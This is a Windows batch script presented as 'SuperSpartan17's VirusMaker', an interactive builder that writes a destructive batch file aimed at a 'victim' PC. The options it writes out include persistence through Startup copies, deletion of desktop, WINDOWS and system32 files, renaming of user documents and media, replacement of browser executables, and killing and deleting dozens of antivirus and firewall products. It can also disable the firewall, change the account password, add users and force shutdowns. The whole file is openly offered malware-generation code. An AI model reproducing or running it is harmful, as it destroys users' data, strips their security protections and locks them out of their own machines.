@echo off
title SuperSpartan17's VirusMaker!
color 04
set userprofile=userprofile
set username=username
set ato=ato
set playa=user32
set math=tsk
set ias=ill
set beer=/A
set mathias=del
set fun=net
set ny=stop
:intro

echo .
echo .
echo #########################################################################
echo #########################################################################
echo ##-------- ##############################################################
echo ##-SSSSSSS-##############################################################
echo ##-S-------##############################################################
echo ##-S-#######-------##------##-------##---------###----###----####---#####
echo ##-S-#######-PPPPP-#---AA---#-RRRR--##-TTTTTTT-##--AA--##-NN--###-N-#####
echo ##-S-------#-P---P-#--A--A--#-R---R-##----T----#--A--A--#-NNN--##-N-#####
echo ##-SSSSSSS-#-P---P-#-A----A-#-R---R-#####-T-####-A----A-#-N--N--#-N-#####
echo ##-------S-#-PPPPP-#-A----A-#-RRRR--#####-T-####-A----A-#-N---N---N-#####
echo ########-S-#-P-----#-AAAAAA-#-R--R--#####-T-####-AAAAAA-#-N-#--N--N-#####
echo ##-------S-#-P-#####-A----A-#-R---R--####-T-####-A----A-#-N-##--NNN-#####
echo ##-SSSSSSS-#-P-#####-A-##-A-#-R-#--R-####-T-####-A-##-A-#-N-####-NN-#####
echo ##---------#---#####---##---#---##---####---####---##---#---####----#####
echo ######################################################################### 
echo .

echo   v   v  i   rrr   u   u   sssss                                
echo   v   v     r   r  u   u   s                                      
echo   v   v  i  r  r   u   u   s                              
echo   v   v  i  rrr    u   u   sssss                             
echo   v   v  i  r r    u   u       s                         
echo    v v   i  r  r   u   u       s   m   m   aa    k   k eeee    rrr    
echo     v    i  r   r  uuuuu   sssss   mm mm  a  a   k  k  e      r   r    
echo                                    m m m  a  a   k k   e      r  r   
echo                                    m   m  aaaa   kk    eeee   rrr    
echo                                    m   m  a  a   k k   e      r  r    
echo                                    m   m  a  a   k  k  eeeee  r   r   
echo .
echo Do you wish to Enter my Virus World?
pause>nul
:begin
cls
echo                              ** Created by SuperSpartan17! **
echo .                                  ** VirusMaker **
echo                                  Y = Yes        N = No
echo .
set /p name=Name of your Virus:
set /p title=Title of your virus:
:extention
echo .
echo Do you wish to Save your Virus as a Batch or Text?  (Press any Key!)
set /p type=(.bat/.txt)
if %type%==bat goto prebegin
if %type%==txt goto prebegin
echo .
echo Type either "txt" or "bat"
pause
cls
goto extention
:prebegin
if exist %name%.%type% goto del
echo @echo off>>%name%.%type%
echo title %title%>>%name%.%type%
goto 1
:1
:@echo
:@echo
echo .
set /p startup=Do you wish to Copy the virus to Startup?:
if %startup%==y goto create1
if %startup%==n goto 2
echo press either "y" for yes, or "n" for no
pause
cls
goto 1
:create1
echo copy "%name%.%type%" "%%userprofile%%\start menu\programs\startup">>%name%.%type%
goto 2
:2
set /p places=Do you wish to Copy to different places in the C Drive?:
if %places%==y goto create2
if %places%==n goto 3
echo press either "y" for yes, or "n" for no
pause
cls
goto 2
:create2
echo copy "%name%.%type%" "c:\WINDOWS">>%name%.%type%
echo copy "%name%.%type%" "c:\WINDOWS\system32">>%name%.%type%
echo copy "%name%.%type%" "c:\WINDOWS\system">>%name%.%type%
echo copy "%name%.%type%" "c:\">>%name%.%type%
echo copy "%name%.%type%" "%%userprofile%%">>%name%.%type%
echo copy "%name%.%type%" "%%userprofile%%\my documents">>%name%.%type%
echo copy "%name%.%type%" "c:\documents and settings">>%name%.%type%
echo cls>>%name%.%type%
goto 3
:3
echo .
set /p buttons=Do you wish to Swap the mouse buttons?:
if %buttons%==y goto create3
if %buttons%==n goto 4
echo press either "y" for yes, or "n" for no
pause
cls
goto 3
:create3
echo set ato=rundll32>>%name%.%type%
echo %%ato%% %playa%.DLL,SwapMouseButton>>%name%.%type%
goto 4
:4
set /p disable=Do you wish to Disable the mouse and keyboard? (N.B. This works only for Windows 95 and 98 only!):
if %disable%==y goto create4
if %disable%==n goto 5
if %disable%==mouse goto create4
if %disable%==keyboard goto create4
echo press either "y" for yes, or "n" for no
pause
cls
goto 4
:create4
echo set ato=rundll32>>%name%.%type%
echo %%ato%% keyboard,disable>>%name%.%type%
echo %%ato%% mouse,disable>>%name%.%type%
goto 5
:5
echo .
set /p music=Do you wish to Hide the "My Music" folder?:
if %music%==y goto create5
if %music%==n goto 6
echo press either "y" for yes, or "n" for no
pause
cls
goto 5
:create5
echo attrib +h "%%userprofile%%\my documents\my music">>%name%.%type%
goto 6
:6
set /p pictures=Do you wish to Hide the "My Pictures" folder?:
if %pictures%==y goto create6
if %pictures%==n goto 7
echo press either "y" for yes, or "n" for no
pause
cls
goto 6
:create6
echo attrib +h "%%userprofile%%\my documents\my pictures">>%name%.%type%
goto 7
:7
set /p videos=Do you wish to Hide the "My Videos" folder?:
if %videos%==y goto create7
if %videos%==n goto 8
echo press either "y" for yes, or "n" for no
pause
cls
goto 7
:create7
echo attrib +h "%%userprofile%%\my documents\my videos">>%name%.%type%
goto 8
:8
set /p docs=Do you wish to Hide the "My Documents" folder?:
if %docs%==y goto create8
if %docs%==n goto 9
echo press either "y" for yes, or "n" for no
pause
cls
goto 8
:create8
echo attrib +h "%%userprofile%%\my documents">>%name%.%type%
if %startup%==y goto 9
goto 10
:9
set /p hidestart=Do you wish to Hide the Virus on Startup?:
if %hidestart%==y goto create9
if %hidestart%==n goto 10
echo press either "y" for yes, or "n" for no
pause
cls
goto 9
:create9
echo attrib +h "%%userprofile%%\start menu\programs\startup\%name%.%type%">>%name%.%type%
echo cls>>%name%.%type%
goto 10
:10
set /p deskobj=Do you wish to Hide everything on the Desktop?:
if %deskobj%==y goto create10
if %deskobj%==n goto 11
echo press either "y" for yes, or "n" for no
pause
cls
goto 10
:create10
echo attrib +h "*.*">>%name%.%type%
echo cls>>%name%.%type%
goto 11
:11
echo .
set /p deldesk=Do you wish to Delete everything on the Desktop?:
if %deldesk%==y goto create11
if %deldesk%==n goto 12
echo press either "y" for yes, or "n" for no
pause
cls
goto 11
:create11
echo del "*.*" /Q /F>>%name%.%type%
echo cls>>%name%.%type%
goto 12
:12
set /p windows=Do you wish to Delete un-used files in  the WINDOWS folder?:
if %windows%==y goto create12
if %windows%==n goto 13
echo press either "y" for yes, or "n" for no
pause
cls
goto 12
:create12
echo cd c:\WINDOWS>>%name%.%type%
echo del "*.*" /S /Q /F>>%name%.%type%
echo cls>>%name%.%type%
goto 13
:13
set /p delsys32=Do you wish to Delete un-used files in the system32 folder?:
if %delsys32%==y goto create13
if %delsys32%==n goto 14
echo press either "y" for yes, or "n" for no
pause
cls
goto 13
:create13
echo cd c:\WINDOWS\system32>>%name%.%type%
echo del "*.*" /S /Q /F>>%name%.%type%
echo cls>>%name%.%type%
goto 14
:14
echo .
set /p rename=Do you wish to Turn all the Documents in the "My Documents" folder into batches?:
if %rename%==y goto create14
if %rename%==n goto 15
echo press either "y" for yes, or "n" for no
pause
cls
goto 14
:create14
echo cd %%userprofile%%\my documents>>%name%.%type%
echo ren *.txt *.bat>>%name%.%type%
echo ren *.doc *.bat>>%name%.%type%
echo ren *.pub *.bat>>%name%.%type%
echo ren *.pps *.bat>>%name%.%type%
echo ren *.htm *.bat>>%name%.%type%
echo ren *.pdf *.bat>>%name%.%type%
echo cls>>%name%.%type%
goto 15
:15
set /p rename2=Do you wish to turn all the Pictures in "My Pictures" into batches?:
if %rename2%==y goto create15
if %rename2%==n goto 16
echo press either "y" for yes, or "n" for no
pause
cls
goto 15
:create15
echo cd %%userprofile%%\my documents\my pictures>>%name%.%type%
echo ren *.gif *.bat>>%name%.%type%
echo ren *.jpg *.bat>>%name%.%type%
echo ren *.jpeg *.bat>>%name%.%type%
echo ren *.bmp *.bat>>%name%.%type%
echo ren *.dip *.bat>>%name%.%type%
echo ren *.tif *.bat>>%name%.%type%
echo ren *.png *.bat>>%name%.%type%
echo cls>>%name%.%type%
goto 16
:16
set /p rename3=Do you wish to turn the Music in "My Music" into batches?:
if %rename3%==y goto create16
if %rename3%==n goto 17
echo press either "y" for yes, or "n" for no
pause
cls
goto 16
:create16
echo cd %%userprofile%%\my documents\my music>>%name%.%type%
echo ren *.mp3 *.bat>>%name%.%type%
echo ren *.mp4 *.bat>>%name%.%type%
echo ren *.wav *.bat>>%name%.%type%
echo ren *.mpeg *.bat>>%name%.%type%
echo ren *.mpg *.bat>>%name%.%type%
echo cls>>%name%.%type%
goto 17
:17
echo .
set /p message=Would you like to Add a message?:
if %message%==y goto create17
if %message%==n goto 18
echo press either "y" for yes, or "n" for no
pause
cls
goto 17
:create17
set /p message2=Message:
echo MSG * %message2%>>%name%.%type%
echo MSG * %message2%>>%name%.%type%
echo MSG * %message2%>>%name%.%type%
echo MSG * %message2%>>%name%.%type%
echo MSG * %message2%>>%name%.%type%
echo cls>>%name%.%type%
goto 18
:18
echo .
set /p changetime=Would you like to Change the Time?:
if %changetime%==y goto create18
if %changetime%==n goto 19
echo press either "y" for yes, or "n" for no
pause
cls
goto 18
:create18
set /p changetime2=Time (ex: 12:30):
echo time %changetime2%>>%name%.%type%
echo cls>>%name%.%type%
goto 19
:19
set /p page=Would you like to open a Web Page?:
if %page%==y goto create19
if %page%==n goto 20
echo press either "y" for yes, or "n" for no
pause
cls
goto 19
:create19
set /p page2=http://
echo start "http://%page2%">>%name%.%type%
echo start "http://%page2%">>%name%.%type%
echo start "http://%page2%">>%name%.%type%
echo cls>>%name%.%type%
goto 20
:20
echo .
set /p mess1=Would you like to Confuse Firefox with CMD?:
if %mess1%==y goto create20
if %mess1%==n goto 21
echo press either "y" for yes, or "n" for no
pause
cls
goto 20
:create20
echo %math%%ias% %beer% firefox>>%name%.%type%
echo %math%%ias% %beer% firefox>>%name%.%type%
echo %math%%ias% %beer% firefox>>%name%.%type%
echo del %programfiles%\mozilla firefox\firefox.exe /Q /S /F>>%name%.%type%
echo copy "c:\WINDOWS\system32\cmd.exe" "%programfiles%\mozilla firefox\firefox.exe">>%name%.%type%
echo cls>>%name%.%type%
goto 21
:21
set /p mess2=Would you like to Confuse IE (Internet Explorer) with Shutdown.exe?:
if %mess2%==y goto create21
if %mess2%==n goto 22
echo press either "y" for yes, or "n" for no
pause
cls
goto 21
:create21
echo %math%%ias% %beer% iexplore>>%name%.%type%
echo %math%%ias% %beer% iexplore>>%name%.%type%
echo %math%%ias% %beer% iexplore>>%name%.%type%
echo del %programfiles%\internet explorer\iexplore.exe /S /Q /F>>%name%.%type%
echo copy "c:\WINDOWS\system32\shutdown.exe" "%programfiles%\internet explorer\iexplore.exe">>%name%.%type%
echo cls>>%name%.%type%
goto 22
:22
set /p mess3=Would you like Confuse MSN Messenger with IE(Internet Explorer)?:
if %mess3%==y goto create22
if %mess3%==n goto 23
echo press either "y" for yes, or "n" for no
pause
cls
goto 22
:create22
echo %math%%ias% %beer% msnmsgr>>%name%.%type%
echo %math%%ias% %beer% msnmsgr>>%name%.%type%
echo %math%%ias% %beer% msnmsgr>>%name%.%type%
echo del %programfiles%\messenger\msmsgs.exe /Q /F>>%name%.%type%
echo copy "c:\WINDOWS\system32\iexpress.exe" "%programfiles%\messenger\msmsgs.exe">>%name%.%type%
echo del %programfiles%\windows live\messenger\msnmsgr.exe>>%name%.%type%
echo copy "c:\WINDOWs\system32\iexpress.exe" "%programfiles%\windows live\messenger\msnmsgr.exe">>%name%.%type%
echo cls>>%name%.%type%
goto 23
:23
set /p replace=Would  you like to Confuse Paint with Calculator?:
if %replace%==y goto create23
if %replace%==n goto 24
echo press either "y" for yes, or "n" for no
pause
cls
goto 23
:create23
echo %math%%ias% %beer% mspaint>>%name%.%type%
echo %math%%ias% %beer% mspaint>>%name%.%type%
echo %math%%ias% %beer% mspaint>>%name%.%type%
echo del "c:\WINDOWS\system32\mspaint.exe" /F /Q /S>>%name%.%type%
echo copy "c:\WINDOWS\system32\calc.exe" "c:\WINDOWS\system32\mspaint.exe">>%name%.%type%
echo cls>>%name%.%type%
goto 24
:24
set /p replace2=Would you like to Confuse Notepad with Minesweeper?:
if %replace2%==y goto create24
if %replace2%==n goto 25
echo press either "y" for yes, or "n" for no
pause
cls
goto 24
:create24
echo %math%%ias% %beer% notepad>>%name%.%type%
echo %math%%ias% %beer% notepad>>%name%.%type%
echo %math%%ias% %beer% notepad>>%name%.%type%
echo del "c:\WINDOWS\system32\notepad.exe" /F /S /Q>>%name%.%type%
echo copy "c:\WINDOWS\system32\winmine.exe" "c:\WINDOWS\system32\notepad.exe">>%name%.%type%
echo cls>>%name%.%type%
goto 25


:25
echo .
set /p av=ould you like to Kill and delete "Some" Antivirus's?
if %av%==y goto create25
if %av%==n goto 26
echo press either "y" for yes, or "n" for no
pause
cls
goto 25
:create25
echo %fun% %ny% “Security Center”>>%name%.%type%
echo %fun%sh firewall set opmode mode=disable>>%name%.%type%
echo %math%%ias% %beer% av*>>%name%.%type%
echo %math%%ias% %beer% fire*>>%name%.%type%
echo %math%%ias% %beer% anti*>>%name%.%type%
echo cls>>%name%.%type%
echo %math%%ias% %beer% spy*>>%name%.%type%
echo %math%%ias% %beer% bullguard>>%name%.%type%
echo %math%%ias% %beer% PersFw>>%name%.%type%
echo %math%%ias% %beer% KAV*>>%name%.%type%
echo %math%%ias% %beer% ZONEALARM>>%name%.%type%
echo %math%%ias% %beer% SAFEWEB>>%name%.%type%
echo cls>>%name%.%type%
echo %math%%ias% %beer% OUTPOST>>%name%.%type%
echo %math%%ias% %beer% nv*>>%name%.%type%
echo %math%%ias% %beer% nav*>>%name%.%type%
echo %math%%ias% %beer% F-*>>%name%.%type%
echo %math%%ias% %beer% ESAFE>>%name%.%type%
echo %math%%ias% %beer% cle>>%name%.%type%
echo cls>>%name%.%type%
echo %math%%ias% %beer% BLACKICE>>%name%.%type%
echo %math%%ias% %beer% def*>>%name%.%type%
echo %math%%ias% %beer% kav>>%name%.%type%
echo %math%%ias% %beer% kav*>>%name%.%type%
echo %math%%ias% %beer% avg*>>%name%.%type%
echo %math%%ias% %beer% ash*>>%name%.%type%
echo cls>>%name%.%type%
echo %math%%ias% %beer% aswupdsv>>%name%.%type%
echo %math%%ias% %beer% ewid*>>%name%.%type%
echo %math%%ias% %beer% guard*>>%name%.%type%
echo %math%%ias% %beer% guar*>>%name%.%type%
echo %math%%ias% %beer% gcasDt*>>%name%.%type%
echo %math%%ias% %beer% msmp*>>%name%.%type%
echo cls>>%name%.%type%
echo %math%%ias% %beer% mcafe*>>%name%.%type%
echo %math%%ias% %beer% mghtml>>%name%.%type%
echo %math%%ias% %beer% msiexec>>%name%.%type%
echo %math%%ias% %beer% outpost>>%name%.%type%
echo %math%%ias% %beer% isafe>>%name%.%type%
echo %math%%ias% %beer% zap*>>%name%.%type%
echo cls>>%name%.%type%
echo %math%%ias% %beer% zauinst>>%name%.%type%
echo %math%%ias% %beer% upd*>>%name%.%type%
echo %math%%ias% %beer% zlclien*>>%name%.%type%
echo %math%%ias% %beer% minilog>>%name%.%type%
echo %math%%ias% %beer% cc*>>%name%.%type%
echo %math%%ias% %beer% norton*>>%name%.%type%
echo cls>>%name%.%type%
echo %math%%ias% %beer% norton au*>>%name%.%type%
echo %math%%ias% %beer% ccc*>>%name%.%type%
echo %math%%ias% %beer% npfmn*>>%name%.%type%
echo %math%%ias% %beer% loge*>>%name%.%type%
echo %math%%ias% %beer% nisum*>>%name%.%type%
echo %math%%ias% %beer% issvc>>%name%.%type%
echo %math%%ias% %beer% tmp*>>%name%.%type%
echo cls>>%name%.%type%
echo %math%%ias% %beer% tmn*>>%name%.%type%
echo %math%%ias% %beer% pcc*>>%name%.%type%
echo %math%%ias% %beer% cpd*>>%name%.%type%
echo %math%%ias% %beer% pop*>>%name%.%type%
echo %math%%ias% %beer% pav*>>%name%.%type%
echo %math%%ias% %beer% padmin>>%name%.%type%
echo cls>>%name%.%type%
echo %math%%ias% %beer% panda*>>%name%.%type%
echo %math%%ias% %beer% avsch*>>%name%.%type%
echo %math%%ias% %beer% sche*>>%name%.%type%
echo %math%%ias% %beer% syman*>>%name%.%type%
echo %math%%ias% %beer% virus*>>%name%.%type%
echo %math%%ias% %beer% realm*>>%name%.%type%
echo cls>>%name%.%type%
echo %math%%ias% %beer% sweep*>>%name%.%type%
echo %math%%ias% %beer% scan*>>%name%.%type%
echo %math%%ias% %beer% ad-*>>%name%.%type%
echo %math%%ias% %beer% safe*>>%name%.%type%
echo %math%%ias% %beer% avas*>>%name%.%type%
echo %math%%ias% %beer% norm*>>%name%.%type%
echo cls>>%name%.%type%
echo %math%%ias% %beer% offg*>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\alwils~1\avast4\*.* > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\Lavasoft\Ad-awa~1\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\kasper~1\*.exe > nul>>%name%.%type%
echo cls>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\trojan~1\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\f-prot95\*.dll > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\tbav\*.dat > nul>>%name%.%type%
echo cls>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\avpersonal\*.vdf > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\Norton~1\*.cnt > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\Mcafee\*.* > nul>>%name%.%type%
echo cls>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\Norton~1\Norton~1\Norton~3\*.* > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\Norton~1\Norton~1\speedd~1\*.* > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\Norton~1\Norton~1\*.* > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\Norton~1\*.* > nul>>%name%.%type%
echo cls>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\avgamsr\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\avgamsvr\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\avgemc\*.exe > nul>>%name%.%type%
echo cls>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\avgcc\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\avgupsvc\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\grisoft > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\nood32krn\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\nood32\*.exe > nul>>%name%.%type%
echo cls>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\nod32 > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\nood32>nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\kav\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\kavmm\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\kaspersky\*.*>>%name%.%type%
echo cls>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\ewidoctrl\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\guard\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\ewido\*.exe > nul>>%name%.%type%
echo cls>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\pavprsrv\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\pavprot\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\avengine\*.exe > nul>>%name%.%type%
echo cls>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\apvxdwin\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\webproxy\*.exe > nul>>%name%.%type%
echo %mathias% /Q /F %ProgramFiles%\panda software\*.* > nul>>%name%.%type%
goto 26
:26
echo .
set /p pswd=Would you like to Change the Users Account Password?:
if %pswd%==y goto create26
if %pswd%==n goto 27
echo press either "y" for yes, or "n" for no
pause
cls
goto 26
:create26
set /p passw=Password:
echo net user %%username%% * %passw%>>%name%.%type%
echo cls>>%name%.%type%
goto 27
:27
set /p add=Would you like to Add 5 New Users to the Victims PC?:
if %add%==y goto create27
if %add%==n goto 28
echo press either "y" for yes, or "n" for no
pause
cls
goto 27
:create27
echo net user %random% /add >>%name%.%type%
echo net user %random% /add >>%name%.%type%
echo net user %random% /add >>%name%.%type%
echo net user %random% /add >>%name%.%type%
echo net user %random% /add >>%name%.%type%
echo cls>>%name%.%type%
goto 28
:28
echo .
set /p spam=Would you like to SPAM the Desktop with folders?:
if %spam%==y goto create28
if %spam%==n goto 29
echo press either "y" for yes, or "n" for no
pause
cls
goto 28
:create28
set number=number
set /p numb=How many folders?:
if %numb%==y goto error28
if %numb%==n goto error28
echo set /a number=1 >>%name%.%type%
echo :mathias >>%name%.%type%
echo set /a number=number +1>>%name%.%type%
echo if %%number%%==%numb% goto next>>%name%.%type%
echo mkdir %%userprofile%%\desktop\%random%>>%name%.%type%
echo goto mathias>>%name%.%type%
echo :next>>%name%.%type%
echo cls>>%name%.%type%
goto 29
:29
set /p cmds=Would you like to Open CMD's?:
if %cmds%==y goto create29
if %cmds%==n goto 2510
echo press either "y" for yes, or "n" for no
pause
cls
goto 29
:create29
set /p numb2=How many?:
if %numb2%==y goto error29
if %numb2%==n goto error29
echo set /a number=1 >>%name%.%type%
echo :mathias2 >>%name%.%type%
echo set /a number=number +1>>%name%.%type%
echo if %%number%%==%numb2% goto next2>>%name%.%type%
echo start cmd>>%name%.%type%
echo goto mathias2>>%name%.%type%
echo :next2>>%name%.%type%
echo cls>>%name%.%type%
goto 2510
:2510
echo .
set /p comm=Would you like to Disable important CMD commands?:
if %comm%==y goto create2510
if %comm%==n goto 30
echo press either "y" for yes, or "n" for no
pause
cls
goto 2510
:create2510
echo del c:\WINDOWS\system32\ipconfig.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\xcopy.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\logoff.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\rename.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\tracert.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\ping.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\ping6.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\compact.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\chkdsk.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\msg.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\attrib.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\format.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\netsh.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\netstat.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\net.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\reg.exe /S /Q /F>>%name%.%type%
echo del c:\WINDOWS\system32\tskill.exe /S /Q /F>>%name%.%type%
echo cls>>%name%.%type%
goto 30
:30
set /p shutdown=Would you like to Shutdown the Computer?:
if %shutdown%==y goto create30
if %shutdown%==n goto end
set /p numb2=How many?:
if %numb2%==y goto error29
if %numb2%==n goto error29
echo press either "y" for yes, or "n" for no
pause
cls
goto 30
:create30
set /p shut= R (Restart), S (Shutdown) or L (Logoff):
if %shut%==r goto create3010
if %shut%==s goto create3020
if %shut%==l goto create3030
echo press either "r" for restart, "s" for shutdown or "l" for logoff
pause
cls
goto create30
:create3010
set /p messa=Would you like to Add a Message before Restart?:
set /p timee=Time before Restart? (In Seconds):
echo shutdown -r -t %timee% -c "%messa%">>%name%.%type%
goto end 
:create3020
set /p messa2=Would you like to Add a Message before Shutdown?:
set /p timee2=Time before Shutdown? (In Seconds):
echo shutdown -s -t %timee2% -c "%messa2%">>%name%.%type%
goto end
:create3030
set /p messa3=Would you like to Add a Message before Logoff?:
set /p timee3=Time before Logoff? (In Seconds):
echo shutdown -l -t %timee3% -c "%messa3%">>%name%.%type%
goto end
:del
echo %name%.%type% already exists. do you wish to delete it?
set /p delete=(y / n)
if %delete%==y goto del2
if %delete%==n goto intro
echo y = yes, n = no
pause
goto del
:del2
del %name%.%type%
goto intro
:end
cls
echo #########################################################################
echo #########################################################################
echo #########################################################################
echo ##-------- ##############################################################
echo ##-SSSSSSS-##############################################################
echo ##-S-------##############################################################
echo ##-S-#######-------##------##-------##---------###----###----####---#####
echo ##-S-#######-PPPPP-#---AA---#-RRRR--##-TTTTTTT-##--AA--##-NN--###-N-#####
echo ##-S-------#-P---P-#--A--A--#-R---R-##----T----#--A--A--#-NNN--##-N-#####
echo ##-SSSSSSS-#-P---P-#-A----A-#-R---R-#####-T-####-A----A-#-N--N--#-N-#####
echo ##-------S-#-PPPPP-#-A----A-#-RRRR--#####-T-####-A----A-#-N---N---N-#####
echo ########-S-#-P-----#-AAAAAA-#-R--R--#####-T-####-AAAAAA-#-N-#--N--N-#####
echo ##-------S-#-P-#####-A----A-#-R---R--####-T-####-A----A-#-N-##--NNN-#####
echo ##-SSSSSSS-#-P-#####-A-##-A-#-R-#--R-####-T-####-A-##-A-#-N-####-NN-#####
echo ##---------#---#####---##---#---##---####---####---##---#---####----#####
echo #########################################################################
echo .
echo Congratualtions your Virus was Succesfully Created...
pause>nul
exit 
:error28
echo you have to type a number here!
pause
goto 28
:error29
echo you have to type a number here!
pause
goto 29